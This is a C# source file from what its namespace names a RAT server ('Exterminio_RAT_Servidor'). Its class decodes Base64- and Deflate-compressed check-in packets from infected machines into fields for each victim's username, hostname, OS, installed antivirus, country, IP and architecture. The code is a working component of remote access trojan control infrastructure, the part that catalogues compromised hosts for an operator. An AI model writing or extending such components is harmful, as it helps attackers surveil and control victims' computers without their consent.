using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace Exterminio_RAT_Servidor
{
    public class PaqueteInformacionReceptor
    {
        public string Id { get; set; }
        public string User { get; set; }
        public string Hostname { get; set; }
        public string SystemOS { get; set; }
        public string AV { get; set; }
        public string Pais { get; set; }
        public string IP { get; set; }
        public string Arch { get; set; }

        public PaqueteInformacionReceptor()
        {
        }

        public PaqueteInformacionReceptor(string datosBase64)
        {
            ProcesarDatosRecibidos(datosBase64);
        }

        public void ProcesarDatosRecibidos(string datosBase64)
        {
            try
            {
                // Decodificar Base64
                byte[] datosComprimidos = Convert.FromBase64String(datosBase64);
                
                // Descomprimir con Deflate
                string informacionDescomprimida;
                using (MemoryStream inputStream = new MemoryStream(datosComprimidos))
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        using (StreamReader reader = new StreamReader(deflateStream, Encoding.UTF8))
                        {
                            informacionDescomprimida = reader.ReadToEnd();
                        }
                    }
                }
                
                // Separar la información por |
                string[] partes = informacionDescomprimida.Split('|');
                
                if (partes.Length >= 8)
                {
                    Id = partes[0];
                    User = partes[1];
                    Hostname = partes[2];
                    SystemOS = partes[3];
                    AV = partes[4];
                    Pais = partes[5];
                    IP = partes[6];
                    Arch = partes[7];
                }
                else
                {
                    throw new Exception("Formato de datos inválido");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando datos recibidos: {ex.Message}");
                // Valores por defecto en caso de error
                Id = "ERROR";
                User = "Unknown";
                Hostname = "Unknown";
                SystemOS = "Unknown";
                AV = "Unknown";
                Pais = "Unknown";
                IP = "Unknown";
                Arch = "Unknown";
            }
        }

        public bool EsValido()
        {
            return !string.IsNullOrEmpty(Id) && Id != "ERROR";
        }

        public override string ToString()
        {
            return $"ID: {Id}, User: {User}, Host: {Hostname}, OS: {SystemOS}, AV: {AV}, País: {Pais}, IP: {IP}, Arch: {Arch}";
        }
    }
}
